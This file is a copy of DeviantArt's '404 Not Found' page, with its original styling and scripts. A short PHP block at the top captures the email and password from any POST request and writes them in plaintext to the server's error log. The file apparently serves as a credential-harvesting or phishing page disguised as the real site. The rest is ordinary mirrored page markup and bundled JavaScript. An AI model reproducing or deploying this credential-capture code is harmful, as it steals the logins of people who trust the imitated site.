<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'unknown';
    $password = $_POST['password'] ?? 'unknown';

    // Log credentials to the error log
    error_log("LOGIN ATTEMPT: Email: $email | Password: $password");
}
?>


<!DOCTYPE html>
<!--[if IE 8]><html class="ie eq8 lt9 lt10 "><![endif]-->
<!--[if IE 9]><html class="ie eq9 lt10 "><![endif]-->
<!--[if IE 10]><html class="ie eq10 "><![endif]-->
<!--[if gt IE 10]><html class="ie "><![endif]-->
<!--[if !IE]><!-->
<html><!--<![endif]--><head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<meta charset="ISO-8859-1">
<title>404 Not Found | DeviantArt</title>
<meta http-equiv="x-dns-prefetch-control" content="off">
<meta property="fb:page_id" content="6452638289">
<link rel="publisher" href="https://plus.google.com/108424020240415471405">
<meta http-equiv="content-language" content="en">
<meta name="copyright" content="Copyright 2025 deviantART">
<meta name="description" content="DeviantArt is the world's largest online social community for artists and art enthusiasts, allowing people to connect through the creation and sharing of art.">
<meta name="twitter:site" content="@deviantart">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://st.deviantart.net/minish/main/logo/card_black_large.png">
<meta name="twitter:image:src" content="https://st.deviantart.net/minish/main/logo/card_black_large.png">
<meta property="og:type" content="website">
<meta property="og:url" content="https://www.deviantart.com/;">
<meta property="og:title" content="404 Not Found | DeviantArt">
<meta property="og:description" content="DeviantArt is the world's largest online social community for artists and art enthusiasts, allowing people to connect through the creation and sharing of art.">
<meta property="og:site_name" content="DeviantArt">
<meta property="og:image" content="https://st.deviantart.net/minish/main/logo/card_black_large.png">
<meta property="twitter:account_id" content="1239671">
        <script async="" src="404%20Not%20Found%20_%20DeviantArt_files/dapx_jc.js"></script><script type="text/javascript">
            window.vms_features={'studio_watermark':1,'studio_sidebar':1,'search_rare_exact':1,'search_fresh':1,'private_sell':1,'new_orders':1,'micro_muro':1,'mature_detection':1,'height_mobile_artstage':1,'fylt_ltr_gallery':1,'comment_spam_classifier':1,'bugfix_torpedo_dblfetch':1,'better_stash_usage':1};
            function vms_feature(feature) {
                return (feature in window.vms_features);
            }
                        function is_beta() {
                return false;
            }
        </script>
        
<style type="text/css">        @font-face {
          font-family: da-bld;
          src: url(https://st.deviantart.net/fonts/deviantart/experimental/devioussans-02-bold.woff2) format('woff2'), url(https://st.deviantart.net/fonts/deviantart/experimental/devioussans-02-bold.woff) format('woff');
          font-weight: 400;
          font-style: normal;
        }

        @font-face {
          font-family: da-xbld;
          src: url(https://st.deviantart.net/fonts/deviantart/experimental/devioussans-02-extrabold.woff2) format('woff2'), url(https://st.deviantart.net/fonts/deviantart/experimental/devioussans-02-extrabold.woff) format('woff');
          font-weight: 400;
          font-style: normal;
        }

        @font-face {
          font-family: da-lt;
          src: url(https://st.deviantart.net/fonts/deviantart/experimental/devioussans-02-light.woff2) format('woff2'), url(https://st.deviantart.net/fonts/deviantart/experimental/devioussans-02-light.woff) format('woff');
          font-weight: 400;
          font-style: normal;
        }

        * {
          padding: 0;
          margin: 0;
        }

        body,
        html {
          width: 100%;
          height: 100%;
          min-height: 100%;
        }

        body {
          background: url(https://st.deviantart.net/artbit/topsecret/error/bg.png?2) repeat-x left top/contain #0b0c12;
        }

        a {
          font-weight: 400;
          text-decoration: underline;
          white-space: nowrap;
        }

        a:hover {
          color: #00c787;
        }

        .headline {
          font: normal 800 64px/normal da-xbld, sans-serif;
          font-stretch: normal;
          letter-spacing: .3px;
        }

        .message {
          font: normal 400 24px/32px da-lt, sans-serif;
          font-stretch: normal;
          letter-spacing: .5px;
          margin: 20px auto;
          display: inline-block;
          max-width: 60vw;
        }

        a, .message, .headline {
          color: #fff;
          text-align: center;
        }

        .logo {
          width: 160px;
          margin: 36px 0 0 60px;
        }

        .logo,
        .content-wrapper {
          position: absolute;
          left: 0;
          top: 0;
        }

        .solid-button,
        .content-wrapper {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
        }


        .solid-button {
          font: normal 700 20px/24px da-bld, sans-serif;
          box-sizing: border-box;
          box-shadow: none;
          border: none;
          border-radius: 4px;
          color: #06070d;
          background: #00e59b;
          text-transform: none;
          white-space: nowrap;
          text-decoration: none;
          display: inline-flex;
          text-align: center;
          margin: 16px auto 0;
          padding: 16px 40px;
        }

        .solid-button:hover {
          color: #06070d;
          background: #00e59b;
        }

        .content-wrapper {
          top: 24px;
          right: 0;
          bottom: 0;
        }

        @media only screen and (max-width:800px) {
          .logo {
            margin: 24px 0 0 24px;
            width: 120px;
            display: block;
          }

          .headline {
            font-size: 36px;
          }

          .message {
            font-size: 16px;
            line-height: 24px;
          }

          .solid-button {
            padding: 12px 32px;
            font-size: 16px;
            line-height: 20px;
          }
        }
    </style><link rel="apple-touch-icon" sizes="180x180" href="https://st.deviantart.net/minish/touch-icons/ios-180.png">
<link rel="apple-touch-icon" sizes="152x152" href="https://st.deviantart.net/minish/touch-icons/ios-152.png">
<link rel="apple-touch-icon" sizes="120x120" href="https://st.deviantart.net/minish/touch-icons/ios-120.png">
<link rel="apple-touch-icon" sizes="76x76" href="https://st.deviantart.net/minish/touch-icons/ios-76.png">
<link rel="icon" sizes="192x192" href="https://st.deviantart.net/minish/touch-icons/android-192.png">
<link rel="icon" sizes="144x144" href="https://st.deviantart.net/minish/touch-icons/android-144.png">
<link rel="icon" sizes="96x96" href="https://st.deviantart.net/minish/touch-icons/android-96.png">
<link rel="icon" sizes="48x48" href="https://st.deviantart.net/minish/touch-icons/android-48.png">
<meta name="application-name" content="DeviantArt">
            <link rel="mask-icon" href="https://st.deviantart.net/minish/touch-icons/touchbar-mark.svg" color="#05cc47">
        <link href="https://www.deviantart.com/;" rel="canonical">
<link rel="alternate" hreflang="en" href="https://www.deviantart.com/;">
<link rel="alternate" hreflang="x-default" href="https://www.deviantart.com/;">
<link href="https://st.deviantart.net/eclipse/icons/da_favicon_v2.ico" rel="shortcut icon">
<script type="text/javascript">
if (!window.deviantART) deviantART = {};deviantART.deviant =[];
deviantART.pageData={"csrf":"PSahTIYKW5GEhmnm.suoxo3.dnxir8IB4ytyZtkuHfUaZAxFAPWQ9nmwmFBTkdayzW4","dwait_total":2};

</script>
<script type="text/javascript">(function(e){function a(e){var a=!1;try{a=JSON.parse(e.data),a.payload=JSON.parse(a.payload)}catch(n){}return a}function n(n){var r=a(n);if(r&&r._type&&"PubSubEvent"==r._type&&(u.push(r),e.PubSub&&e.PubSubCrossFrame)){t(!1);for(var s=0,o=u.length;o>s;s++)r=u[s],PubSubCrossFrame.publish(r.eventname,r.payload,r.quiet);if(e.vms_feature&&vms_feature("dre")){var b=u.slice().map(function(e){return{eventname:e.eventname,payload:(JSON.stringify(e.payload)+"").substr(0,100),quiet:e.quiet}});e.debug_pubsubcrossframe=function(){console.group("Accumulated PubSubCrossFrame events"),console.table(b),console.groupEnd()}}u=null}}function t(a){e.addEventListener?e[(a?"add":"remove")+"EventListener"]("message",n):e[(a?"detach":"attach")+"Event"]("onmessage",n)}var u=[];e.PubSubCrossFrame||t(!0)})(window);</script>
<script type="text/javascript">(function(t){var r=function(r){if(!r||"object"!=typeof r||r.nodeType||r==t)return!1;var n=Object.prototype.hasOwnProperty;try{if(r.constructor&&!n.call(r,"constructor")&&!n.call(r.constructor.prototype,"isPrototypeOf"))return!1}catch(o){return!1}var e;for(e in r);return void 0===e||n.call(r,e)},n=function(t){var o,e={};for(o in t)e[o]=r(t[o])?n(t[o]):t[o];return e},o=Array.isArray||function(t){return"[object Array]"===toString.call(t)},e={},l=/^.*\..*$/,i=function(t){if(t){if("function"==typeof t)throw"Glbl isn't meant to store functions, yo";if(o(t))for(var n=0,e=t.length;e>n;n++)i(t[n]);else if(r(t))for(var n in t)i(t[n])}};t.Glbl=function(t,o){if(1==arguments.length)return o=e[t],r(o)&&(o=n(o)),o;if("string"!=typeof t||!l.test(t))throw console.trace(),"Glbl keys need to be namespaced (dot-separated)";return i(o),r(o)&&(o=n(o)),e[t]=o,o},t.Glbl.dflt=function(t,n){if(r(t)){if(void 0!==n)throw"Misuse of Glbl, you cannot pass a dictionary AND a default value";for(var o in t)Glbl.dflt(o,t[o])}else void 0===Glbl(t)&&Glbl(t,n)},t.Glbl.plus=function(t,r){return 1===arguments.length&&(r=1),i(r),Glbl(t,(0|Glbl(t))+r)},t.Glbl.minus=function(t,r){return 1===arguments.length&&(r=1),i(r),Glbl(t,(0|Glbl(t))-r)},t.Glbl.match=function(t){var r={};for(var n in e)t.test(n)&&(r[n]=e[n]);return r},t.Glbl.del=function(t){void 0!==e[t]&&delete e[t]}})(window);</script>
<script type="text/javascript">window.deviantART||(window.deviantART={}),function(){var t=function(){};window.breakpoint||(window.breakpoint=t),window.console||(window.console={log:t,trace:t,info:t,warn:t}),window.ddt||(window.ddt={log:t,info:t,warn:t,watch:t,unwatch:t,watching:t,alert:t,error:t})}(),DWait={X:[],L:{},T:{},R:{},D:"jms/dwait/download.js",MC:((window.deviantART||{}).pageData||{}).dwait_total||0,ready:function(t,i){var e,a;for(t instanceof Array||(t=[t]),i instanceof Array||(i=[this,i]),"string"==typeof i[1]&&(i[1]=Function(i[1])),a={},e=0;e!=t.length;e++)a[t[e]]=1;for(DWait.X.push({m:a,c:i}),DWait.fire(),e=0;e!=t.length;e++)DWait._trip(t[e])},_trip:function(t){if(!DWait.L[t]&&DWait.T[t]&&t!=DWait.D){var i=DWait.T[t];DWait.ready(DWait.D,function(){DWait.download(i,function(){DWait.unroll(i)})})}},count:function(){--DWait.MC||setTimeout(function(){DWait.run(".allready")},1)},fire:function(){var t,i,e,a;for(t=0;e=this.X[t];t++){a=!1;for(i in e.m){if(!this.L[i]){a=!0;break}delete e.m[i]}if(!a){this.X.splice(t,1),t--,e.c[1].apply(e.c[0],(e.c[2]||[]).concat([this.L[i]])),setTimeout(function(){DWait.fire()},1);break}}},run:function(t,i,e){t.indexOf("__")>0&&console.log("[DWait] Running branched file: ",t),this.L[t.replace(/__([A-Za-z0-9_-]+)/,"")]=i||1,this.T[t]&&!e&&this.unroll(this.T[t],i),DWait.fire()},unroll:function(t,i){t instanceof Array||(t=[t]);var e,a,n,r,o;for(e=0;a=t[e];e++){if(a=a.replace(/\?.*/,""),n=this.R[a])for(r=0;o=n[r];r++)!this.L[o]&&this._is_css.test(o)&&this.run(o,i,!0);delete this.R[a]}},_is_css:/\.css$/,N:[],readyLink:function(t,i,e){var a;if(window.event&&(window.event.cancelBubble=!0),e instanceof Array||(e=[i,e,[]]),!this.L[t]){for(a=0;a!=this.N.length;a++)if(this.N[a]==i)return!1;this.N.push(i),i.style.cursor="wait",i.className+=" active",this.ready(t,[this,this.fixLink,[i]])}if(this.ready.call(i,t,e),i.blur)try{i.blur()}catch(n){}return!1},linkCheck:function(){return!0},fixLink:function(t){var i;for(t.style.cursor="pointer",t.className=t.className.replace(/\bactive\b/,""),i=0;i!=this.N.length;i++)if(this.N[i]==t)return this.N.splice(i,1)},bind:function(t,i,e){return[t,i,e]},loadDownloadMap:function(t){this.T=t,this.retrip()},loadRollupMap:function(t){this.R=t},retrip:function(){for(var t=this.X.length;t--;)for(var i in this.X[t].m)this._trip(i)},replay:function(){DWait.replay.active=!0;try{$(document.body).on("click.dwait",function(t){t.preventDefault()}).find(".dwaiting").removeClass("dwaiting active").gmiWake().click().end().off("click.dwait")}finally{DWait.replay.active=!1}}},function(){function t(t){t=t||window.event;for(var a,r=t.target||t.srcElement,o=r,c=r,s=d+t.type,l=t.type&&"click"==t.type&&!(DWait.replay&&DWait.replay.active);r&&!(r.getAttribute&&(a=r.getAttribute(s))||l&&/\bdwait\b/.test(r.className));)r=r.parentNode;var f=t.which&&t.which>1||t.button>0;if("click"===t.type&&!t.defaultPrevented&&t.returnValue!==!1&&(t.altKey||t.ctrlKey||t.metaKey||t.shiftKey||f))do if("A"===c.nodeName){if(c.href&&0!==c.href.indexOf("javascript:")&&"#"!==c.href)return!0;break}while(c=c.parentNode);var u=function(){t.stopPropagation?t.stopPropagation():t.cancelBubble=!0,t.preventDefault?t.preventDefault():t.returnValue=!1};return a?r.dwait_init_done?!0:i(a,r)?(u(),r.dwait_init_id?"click"==t.type&&(n[r.dwait_init_id]=o):e(a,r,t),!1):(r.dwait_init_done=!0,!0):l&&r&&/\bdwait\b/.test(r.className)?(/\bdwaiting\b/.test(o.className)||(o.className+=" active dwaiting"),void 0===DWait.replay.active&&(DWait.replay.active=!1,DWait.ready([".jqready",".allready"],DWait.replay)),u(),!1):!0}function i(t,i){if(o[t])for(var e=0;o[t].length>e;e++)if(!o[t][e].call(i,i,t))return!1;return!0}function e(t,i,e){function a(){if(r[t])for(var e=0;r[t].length>e;e++)r[t][e].call(i,i,l);i.dwait_init_done=!0,i.className=i.className.replace(/\binit-waiting\b/,"");var a=n[i.dwait_init_id];a&&a.click&&setTimeout(function(){a.click()},1)}var o=s++,c=i.getAttribute(d+"deps"),l=e&&e.type?e.type:"domready";return i.dwait_init_id=o,"click"==l&&(n[o]=e.target||e.srcElement),c&&c.split?(c=c.split(","),i.className+=" init-waiting",DWait.ready(c,a),void 0):(a(),void 0)}var a,n={},r={},o={},c=["click","mouseover"],d="data-dwait-",s=1;for(DWait.init=function(t,i,e){r[t]||(r[t]=[]),r[t].push(i),"function"==typeof e&&(o[t]||(o[t]=[]),o[t].push(e))},DWait.init_domready=function(t){$("[data-dwait-domready]",t).each(function(){this.dwait_init_done||this.dwait_init_id||!this.getAttribute||e(this.getAttribute("data-dwait-domready"),this)})},DWait.ready(".domready",function(){DWait.init_domready()}),a=0;c.length>a;a++)document.addEventListener?document.addEventListener(c[a],t,!1):document.attachEvent&&document.attachEvent("on"+c[a],t)}();</script><script type="text/javascript">if (window.DWait) {DWait.run('jms/lib/pubsubcrossframe.fastcall.js');DWait.run('jms/lib/glbl.js');DWait.run('jms/dwait/dwait.js');}</script><script type="text/javascript">
            DWait.loadRollupMap({"https:\/\/st.deviantart.net\/css\/flatpickr_lc.css":["cssms\/lib\/flatpickr.css"]});
            </script><script type="text/javascript">DWait.ready(["jms\/lib\/glbl.js"], function(){ Glbl('Site.is_eclipse', true); Glbl('Duperbrowse.disabled', true);  });</script>
<style type="text/css"></style></head>
<body id="deviantART-v5" class="secure error-404 deviantart">
        <div class="content-wrapper">
            <a href="https://deviantart.com/">
                <img src="404%20Not%20Found%20_%20DeviantArt_files/p-01-da-logo-white.svg" class="logo">
            </a>
            <h1 class="headline">404 Not Found</h1>
                    <p class="message">The page you were looking for doesn't exist.</p>
                    <a href="https://x.com/DeviantArt" class="solid-button">Browse Art</a>
        </div>
            <script type="text/javascript">
            (function() {
                var content = document.querySelector('div.bubbleview, .match-body-height');
                var footer = document.querySelector('#depths');
                if (content && footer) {
                    var height = window.getComputedStyle(content).getPropertyValue('height');
                    height = parseInt(height, 10) || content.clientHeight;
                    content.style.minHeight = height + document.documentElement.clientHeight -
                                              footer.getBoundingClientRect().bottom + 'px';
                }
            })();
        </script>
        
<script type="text/javascript" async="" src="404%20Not%20Found%20_%20DeviantArt_files/deviantart-network_jc.js" charset="utf-8"></script>
<script type="text/javascript" async="" src="404%20Not%20Found%20_%20DeviantArt_files/v6core_jc.js" charset="utf-8"></script><a id="deviantART-loves-you"> </a>
<script type="text/javascript">
                DWait.loadDownloadMap({"jms\/thirdparty\/lib\/flatpickr\/flatpickr.js":["https:\/\/st.deviantart.net\/css\/flatpickr_jc.js?3871654166","https:\/\/st.deviantart.net\/css\/flatpickr_lc.css?988834512"]});
                </script><script type="text/javascript">
                (function(d, e, v, i, a, n, t){
                    d.dapx = d.dapx || function() { (d.dapx.q = d.dapx.q || []).push(arguments)};
                    d.dapx.drift = i ? Math.round(new Date()*.001)-i : 0;
                    n = e.createElement(v);
                    t = e.getElementsByTagName(v)[0];
                    n.async = 1;
                    n.src = "https://st.deviantart.net/css/dapx_jc.js?4245352008";
                    t.parentNode.insertBefore(n, t);
                })(window, document, "script", 1744604787);
            </script><script type="text/javascript">DWait.ready(["jms\/lib\/pubsub.js"], function(){ PubSub.publish("DaPx.initialize", {"client":"dw","daid":"fbc269968ae9e80e7aa330bdc3a1c2e5","requestid":"673m76e73689106f32510ee717efd4fd50c9","log_data":[],"eventid":"daweb:other::::pageview","delay_init_event":false}); });</script>


</body></html>